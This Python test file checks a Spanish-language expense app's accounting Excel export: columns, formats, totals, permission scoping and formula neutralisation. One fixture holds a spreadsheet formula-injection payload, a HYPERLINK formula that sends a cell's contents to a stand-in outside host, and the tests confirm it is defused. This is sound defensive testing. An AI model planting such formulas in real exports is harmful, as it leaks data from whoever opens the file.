"""Excel contable de los gastos: columnas, totales, formato, alcance por permiso y que no queden fórmulas.

Los gastos de estas pruebas están en proyectos propios y en marzo de 2031: ninguna otra prueba escribe ahí, así que las
cifras del libro son exactas.
"""
import io
from datetime import date, datetime

import pytest
from openpyxl import load_workbook

from app import config, db
from app.servicios import acceso, contable, viajes

DESDE, HASTA = "2031-03-01", "2031-03-31"
P_A, P_B = 9301, 9302


def _cuenta(correo: str, nombre: str, rol: str) -> dict:
    fila = db.uno("select * from usuarios where correo=:c", c=correo)
    if not fila:
        acceso.crear_usuario(correo, nombre, rol, "clave-contable-2031")
        fila = db.uno("select * from usuarios where correo=:c", c=correo)
    return fila


def _gasto(cuenta: dict, proyecto: int, **campos) -> int:
    datos = {"usuario_id": cuenta["id"], "viajero_id": cuenta["viajero_id"], "proyecto_id": proyecto, "comercio": "Comercio",
             "fecha": "2031-03-10", "categoria": "otros", "moneda": "USD", "estado": "aprobado_auto", "alertas": [],
             "creado": "2031-03-10 12:00:00", **campos}
    if "total_usd" not in datos and datos["moneda"] == "USD":
        datos["total_usd"] = datos.get("total")
    return db.insertar("gastos", **datos)


def _evento(gasto_id: int, paso: str, momento: str):
    db.insertar("eventos", momento=momento, entidad="gasto", entidad_id=gasto_id, paso=paso, detalle="", fuente="pruebas")


@pytest.fixture(scope="module")
def mundo():
    for pid, nombre in ((P_A, "Obra contable Norte"), (P_B, "Obra contable Sur")):
        if not db.uno("select id from proyectos where id=:i", i=pid):
            db.insertar("proyectos", id=pid, nombre=nombre, ciudad="Ciudad", fecha_inicio="2031-03-01", fecha_fin="2031-03-31",
                        moneda="USD")
    a = _cuenta("contable-a@demo.local", "Ana Contable", "colaborador")
    b = _cuenta("contable-b@demo.local", "Beto Contable", "colaborador")
    g = _cuenta("contable-gestor@demo.local", "Gema Gestora", "gestor")
    admin = db.uno("select * from usuarios where correo='admin@demo.local'")
    if not db.uno("select id from proyecto_miembros where usuario_id=:u and proyecto_id=:p", u=g["id"], p=P_A):
        db.insertar("proyecto_miembros", usuario_id=g["id"], proyecto_id=P_A, papel="gestor", creado=db.ahora())
    viaje = db.insertar("viajes", proyecto_id=P_A, usuario_id=a["id"], viajero_id=a["viajero_id"], ida="2031-03-01",
                        regreso="2031-03-05", presupuesto_usd=1000, estado="aprobado", creado="2031-02-20 10:00:00")
    ids = {
        "vuelo_a": _gasto(a, P_A, viaje_id=viaje, comercio="American Airlines", fecha="2031-03-02", categoria="vuelo",
                          subtotal=300, impuesto=20, total=320),
        "hotel_a": _gasto(a, P_B, comercio="Hotel Alfama", fecha="2031-03-06", categoria="hotel", subtotal=100, total=100,
                          moneda="EUR", total_usd=108, estado="aprobado", revisado_por=admin["id"],
                          alertas=["Aprobado con excepción: tarifa pactada con el cliente"]),
        "comida_b": _gasto(b, P_A, comercio='=HYPERLINK("http://x.example/?"&A1,"abrir")', fecha="2031-03-12",
                           categoria="comida", total=45),
        "gasolina_b": _gasto(b, P_B, comercio="Gasolinera\x01 Norte", fecha="2031-03-20", categoria="combustible", total=60,
                             moneda="EUR", total_usd=64.8),
        "parqueo_g": _gasto(g, P_B, comercio="Parqueadero", fecha="2031-03-31", categoria="parqueo_peajes", total=12),
        "en_revision_a": _gasto(a, P_A, comercio="Pendiente", fecha="2031-03-15", total=999, estado="revision"),
        "fuera_del_periodo_a": _gasto(a, P_A, comercio="Abril", fecha="2031-04-01", categoria="vuelo", total=50),
    }
    _evento(ids["vuelo_a"], "aprobado sin intervención", "2031-03-02 10:00:00")
    _evento(ids["hotel_a"], "enviado a revisión", "2031-03-06 08:00:00")
    _evento(ids["hotel_a"], "aprobado con excepción", "2031-03-06 09:30:00")
    return {"a": a, "b": b, "g": g, "admin": admin, "viaje": viaje, **ids}


def _libro(contenido: bytes):
    return load_workbook(io.BytesIO(contenido))


def _filas(contenido: bytes) -> list[dict]:
    hoja = _libro(contenido)["Gastos"]
    filas = list(hoja.iter_rows(values_only=True))
    return [dict(zip(filas[0], f, strict=True)) for f in filas[1:]]


def _ids(contenido: bytes) -> set[int]:
    return {f["N.º gasto"] for f in _filas(contenido)}


def _seccion(contenido: bytes, titulo: str) -> list[dict]:
    """Una tabla de la hoja Resumen: el título, el encabezado y las filas hasta la primera vacía."""
    filas = list(_libro(contenido)["Resumen"].iter_rows(values_only=True))
    inicio = next(i for i, f in enumerate(filas) if f[0] == titulo)
    encabezado = [c for c in filas[inicio + 1] if c is not None]
    salida = []
    for f in filas[inicio + 2:]:
        if f[0] is None:
            break
        salida.append(dict(zip(encabezado, f[:len(encabezado)], strict=True)))
    return salida


def _parametros(contenido: bytes) -> dict:
    filas = list(_libro(contenido)["Resumen"].iter_rows(values_only=True))
    inicio = next(i for i, f in enumerate(filas) if f[0] == "Parámetros")
    salida = {}
    for f in filas[inicio + 1:]:
        if f[0] is None:
            break
        salida[f[0]] = f[1]
    return salida


def test_el_libro_trae_las_hojas_y_las_columnas_contables(mundo):
    libro = _libro(contable.libro(mundo["admin"], DESDE, HASTA))
    assert libro.sheetnames == ["Gastos", "Resumen"]
    encabezado = [c.value for c in libro["Gastos"][1]]
    assert encabezado == [c["titulo"] for c in contable.COLUMNAS]
    for esperada in ("Fecha", "Viaje", "Proyecto", "Código persona", "Persona", "Proveedor o comercio", "Categoría",
                     "Cuenta contable", "Base", "Impuesto", "Total", "Moneda", "Tasa a USD", "Total USD", "Estado",
                     "Aprobado por", "Aprobado el (UTC)", "Alertas o excepción", "Soporte en la plataforma"):
        assert esperada in encabezado


def test_administracion_ve_los_aprobados_del_periodo_y_nada_mas(mundo):
    ids = _ids(contable.libro(mundo["admin"], DESDE, HASTA))
    assert ids == {mundo[k] for k in ("vuelo_a", "hotel_a", "comida_b", "gasolina_b", "parqueo_g")}


def test_cada_fila_trae_lo_que_necesita_contabilidad(mundo):
    filas = {f["N.º gasto"]: f for f in _filas(contable.libro(mundo["admin"], DESDE, HASTA))}
    a = mundo["a"]
    vuelo = filas[mundo["vuelo_a"]]
    assert vuelo["Fecha"] == datetime(2031, 3, 2)
    assert vuelo["Viaje"] == viajes.codigo_viaje({"id": mundo["viaje"], "creado": "2031-02-20"})
    assert vuelo["Proyecto"] == "Obra contable Norte"
    assert (vuelo["Código persona"], vuelo["Persona"]) == (viajes.codigo_persona(a["id"]), "Ana Contable")
    assert vuelo["Proveedor o comercio"] == "American Airlines"
    assert vuelo["Categoría"] == config.CATEGORIAS["vuelo"]
    assert vuelo["Cuenta contable"] == contable.CUENTAS["vuelo"]
    assert (vuelo["Base"], vuelo["Impuesto"], vuelo["Total"], vuelo["Moneda"]) == (300, 20, 320, "USD")
    assert (vuelo["Tasa a USD"], vuelo["Total USD"]) == (1, 320)
    assert vuelo["Estado"] == "Aprobado automático"
    assert vuelo["Aprobado por"] == "Automática (reglas de validación)"
    assert vuelo["Aprobado el (UTC)"] == datetime(2031, 3, 2, 10, 0)
    assert vuelo["Alertas o excepción"] is None
    assert vuelo["Soporte en la plataforma"] == f"/gastos/{mundo['vuelo_a']}"

    hotel = filas[mundo["hotel_a"]]
    # Sin viaje, la persona es la cuenta del viajero; sin impuesto leído, la celda queda vacía
    assert (hotel["Código persona"], hotel["Viaje"], hotel["Impuesto"]) == (viajes.codigo_persona(a["id"]), None, None)
    assert (hotel["Total"], hotel["Moneda"], hotel["Tasa a USD"], hotel["Total USD"]) == (100, "EUR", 1.08, 108)
    assert hotel["Estado"] == "Aprobado"
    assert hotel["Aprobado por"] == f"{viajes.codigo_persona(mundo['admin']['id'])} · {mundo['admin']['nombre']}"
    assert hotel["Aprobado el (UTC)"] == datetime(2031, 3, 6, 9, 30)
    assert hotel["Alertas o excepción"] == "Aprobado con excepción: tarifa pactada con el cliente"


def test_fechas_importes_y_encabezados_tienen_formato_de_hoja_contable(mundo):
    hoja = _libro(contable.libro(mundo["admin"], DESDE, HASTA))["Gastos"]
    encabezado = {c.value: c.column_letter for c in hoja[1]}
    assert all(c.font.bold for c in hoja[1])
    assert hoja.freeze_panes == "A2"
    assert hoja.auto_filter.ref == f"A1:{hoja.cell(1, hoja.max_column).column_letter}{hoja.max_row}"
    fila = 2
    assert hoja[f"{encabezado['Fecha']}{fila}"].is_date and hoja[f"{encabezado['Fecha']}{fila}"].number_format == "yyyy-mm-dd"
    assert hoja[f"{encabezado['Aprobado el (UTC)']}{fila}"].is_date
    for importe in ("Base", "Total", "Total USD"):
        assert hoja[f"{encabezado[importe]}{fila}"].number_format == "#,##0.00", importe
    assert hoja[f"{encabezado['Tasa a USD']}{fila}"].number_format == "0.00####"
    for letra in encabezado.values():
        assert hoja.column_dimensions[letra].width >= 9, letra


def test_no_queda_ninguna_formula_ni_caracter_que_rompa_la_hoja(mundo):
    contenido = contable.libro(mundo["admin"], DESDE, HASTA)
    libro = _libro(contenido)
    for hoja in libro.worksheets:
        for fila in hoja.iter_rows():
            for celda in fila:
                assert celda.data_type != "f", (hoja.title, celda.coordinate)
                assert not (isinstance(celda.value, str) and celda.value.startswith(("=", "+", "-", "@"))), celda.value
    comercios = {f["N.º gasto"]: f["Proveedor o comercio"] for f in _filas(contenido)}
    assert comercios[mundo["comida_b"]] == '\'=HYPERLINK("http://x.example/?"&A1,"abrir")'
    assert comercios[mundo["gasolina_b"]] == "Gasolinera Norte"


def test_el_colaborador_solo_ve_sus_gastos(mundo):
    assert _ids(contable.libro(mundo["a"], DESDE, HASTA)) == {mundo["vuelo_a"], mundo["hotel_a"]}
    assert _ids(contable.libro(mundo["b"], DESDE, HASTA)) == {mundo["comida_b"], mundo["gasolina_b"]}


def test_el_gestor_ve_su_proyecto_y_lo_suyo_pero_no_lo_ajeno_de_otro_proyecto(mundo):
    ids = _ids(contable.libro(mundo["g"], DESDE, HASTA))
    assert ids == {mundo["vuelo_a"], mundo["comida_b"], mundo["parqueo_g"]}
    assert mundo["hotel_a"] not in ids and mundo["gasolina_b"] not in ids


def test_el_filtro_de_proyecto_se_comprueba_contra_el_permiso(mundo):
    assert _ids(contable.libro(mundo["admin"], DESDE, HASTA, proyecto_id=P_A)) == {mundo["vuelo_a"], mundo["comida_b"]}
    assert _ids(contable.libro(mundo["g"], DESDE, HASTA, proyecto_id=P_A)) == {mundo["vuelo_a"], mundo["comida_b"]}
    with pytest.raises(contable.SinPermiso):
        contable.libro(mundo["g"], DESDE, HASTA, proyecto_id=P_B)   # no lo gestiona
    with pytest.raises(contable.SinPermiso):
        contable.libro(mundo["a"], DESDE, HASTA, proyecto_id=P_A)   # un colaborador no descarga el libro de un proyecto
    with pytest.raises(ValueError, match="no existe"):
        contable.libro(mundo["admin"], DESDE, HASTA, proyecto_id=987654)


def test_el_resumen_suma_por_proyecto_por_cuenta_y_por_moneda(mundo):
    contenido = contable.libro(mundo["admin"], DESDE, HASTA)
    por_proyecto = {f["Proyecto"]: (f["Gastos"], f["Total USD"]) for f in _seccion(contenido, "Por proyecto")}
    assert por_proyecto == {"Obra contable Norte": (2, 365), "Obra contable Sur": (3, 184.8), "Total": (5, 549.8)}
    por_cuenta = {f["Cuenta contable"]: (f["Categoría"], f["Gastos"], f["Total USD"]) for f in _seccion(contenido, "Por cuenta contable")}
    assert por_cuenta[contable.CUENTAS["vuelo"]] == ("Vuelo", 1, 320)
    assert por_cuenta[contable.CUENTAS["hotel"]] == ("Hotel", 1, 108)
    assert por_cuenta["Total"][1:] == (5, 549.8)
    por_moneda = {f["Moneda"]: (f["Gastos"], f["Total en la moneda"], f["Total USD"]) for f in _seccion(contenido, "Por moneda")}
    assert por_moneda["USD"] == (3, 377, 377) and por_moneda["EUR"] == (2, 160, 172.8)
    assert por_moneda["Total"][0] == 5 and por_moneda["Total"][2] == 549.8


def test_el_resumen_dice_con_que_parametros_se_genero(mundo):
    parametros = _parametros(contable.libro(mundo["g"], DESDE, HASTA, proyecto_id=P_A))
    assert parametros["Desde"] == datetime(2031, 3, 1) and parametros["Hasta"] == datetime(2031, 3, 31)
    assert parametros["Proyecto"] == "Obra contable Norte"
    assert parametros["Estados incluidos"] == "Aprobado, Aprobado automático"
    assert parametros["Generado por"] == f"{viajes.codigo_persona(mundo['g']['id'])} · Gema Gestora"
    assert isinstance(parametros["Generado el (UTC)"], datetime)
    assert "gestiona" in parametros["Alcance"]
    assert parametros["Gastos incluidos"] == 2
    assert "supuesto" in parametros["Cuentas contables"].lower()


def test_la_cuenta_sale_del_mapa_editable_y_tambien_se_neutraliza(mundo):
    contable.asegurar_cuentas()
    regla = db.uno("select * from reglas where ambito='supuesto' and clave='cuenta_contable_vuelo'")
    try:
        db.actualizar("reglas", regla["id"], valor="=5105 Pasajes")
        filas = {f["N.º gasto"]: f for f in _filas(contable.libro(mundo["admin"], DESDE, HASTA))}
        assert filas[mundo["vuelo_a"]]["Cuenta contable"] == "'=5105 Pasajes"
        db.actualizar("reglas", regla["id"], valor="")
        filas = {f["N.º gasto"]: f for f in _filas(contable.libro(mundo["admin"], DESDE, HASTA))}
        assert filas[mundo["vuelo_a"]]["Cuenta contable"] == contable.SIN_CUENTA
    finally:
        db.actualizar("reglas", regla["id"], valor=regla["valor"])


def test_el_mapa_de_cuentas_cubre_todas_las_categorias_y_queda_marcado_como_supuesto():
    assert set(contable.CUENTAS) == set(config.CATEGORIAS)
    contable.asegurar_cuentas()
    reglas = {r["clave"]: r for r in db.todos("select * from reglas where ambito='supuesto' and clave like 'cuenta_contable_%'")}
    for categoria in config.CATEGORIAS:
        r = reglas[f"cuenta_contable_{categoria}"]
        assert r["confianza"] == "supuesto" and r["fuente"] == "Supuesto editable" and r["valor"]


def test_otros_estados_se_incluyen_solo_si_se_piden(mundo):
    ids = _ids(contable.libro(mundo["admin"], DESDE, HASTA, estados=("aprobado", "aprobado_auto", "revision")))
    assert mundo["en_revision_a"] in ids
    with pytest.raises(ValueError, match="estado"):
        contable.libro(mundo["admin"], DESDE, HASTA, estados=("borrado",))


@pytest.mark.parametrize("desde,hasta", [("2031-03-31", "2031-03-01"), ("marzo", "2031-03-31"), ("2031-03-01", "")])
def test_las_fechas_invalidas_se_rechazan_con_un_texto_claro(mundo, desde, hasta):
    with pytest.raises(ValueError, match="fecha"):
        contable.libro(mundo["admin"], desde, hasta)


def test_el_enlace_al_soporte_es_absoluto_si_se_conoce_la_direccion(mundo):
    hoja = _libro(contable.libro(mundo["admin"], DESDE, HASTA, enlace_base="https://plataforma.example"))["Gastos"]
    encabezado = {c.value: c.column for c in hoja[1]}
    celda = hoja.cell(2, encabezado["Soporte en la plataforma"])
    assert celda.value.startswith("https://plataforma.example/gastos/")
    assert celda.hyperlink.target == celda.value


def test_la_semilla_siembra_el_mapa_de_cuentas_si_falta():
    from datos import semilla
    db.ejecutar("delete from reglas where ambito='supuesto' and clave='cuenta_contable_hotel'")
    semilla.sembrar()
    regla = db.uno("select * from reglas where ambito='supuesto' and clave='cuenta_contable_hotel'")
    assert regla and regla["valor"] == contable.CUENTAS["hotel"] and regla["confianza"] == "supuesto"


def test_el_mes_en_curso_va_del_primero_al_ultimo_dia():
    assert contable.mes_en_curso(date(2026, 2, 14)) == ("2026-02-01", "2026-02-28")
    assert contable.mes_en_curso(date(2026, 12, 31)) == ("2026-12-01", "2026-12-31")
